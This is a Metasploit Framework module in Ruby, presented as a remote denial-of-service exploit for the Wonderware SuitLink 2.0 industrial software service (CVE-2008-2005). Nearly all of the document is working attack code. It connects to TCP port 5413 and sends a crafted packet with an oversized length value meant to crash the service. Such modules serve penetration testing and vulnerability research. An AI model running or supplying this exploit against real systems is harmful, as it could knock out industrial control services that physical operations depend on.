WonderWare SuiteLink 2.0 Remote Denial of Service Exploit (meta)
================================================================






##
# $Id: suitlink.rb $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require &#039;msf/core&#039;

module Msf

class Auxiliary::Dos::Windows::Wonderware::SuitLink < Msf::Auxiliary

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			&#039;Name&#039;           => &#039;Wonderware SuitLink Denial of Service&#039;,
			&#039;Description&#039;    => %q{
				This module exploits a denial of service vulnerability
				within the SuitLink service in Wonderware products.
			},
			&#039;Author&#039;         => [ &#039;belay tows&#039; ],
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Version&#039;        => &#039;$Revision: 1 $&#039;,
			&#039;References&#039;     =>
				[
					[ &#039;BID&#039;, &#039;28974&#039; ],
					[ &#039;CVE&#039;, &#039;2008-2005&#039; ],
				],
			&#039;DisclosureDate&#039; => &#039;May 05 2008&#039;))
			
			register_options([Opt::RPORT(5413),], self.class)
	end

	def run
		connect

		print_status("Sending DoS packet...")

        dos_length = 0xBAADF00D

		pkt =  "\xD5\xCF\xC7\xF8\x0B\xCD\xD3\x11\xAA\x10\x00\xA0\xC9\xEC\xFD\x9F"
		pkt << Rex::Text.rand_text_alpha(0x14) + "\x00\x00"
        pkt << [dos_length].pack("V")
	
        len = [pkt.length].pack("C")
		sock.put(len)
		
		sock.put(pkt)

        sleep 15 # wait to avoid thread shutdown event
		
		disconnect
	end

end
end	



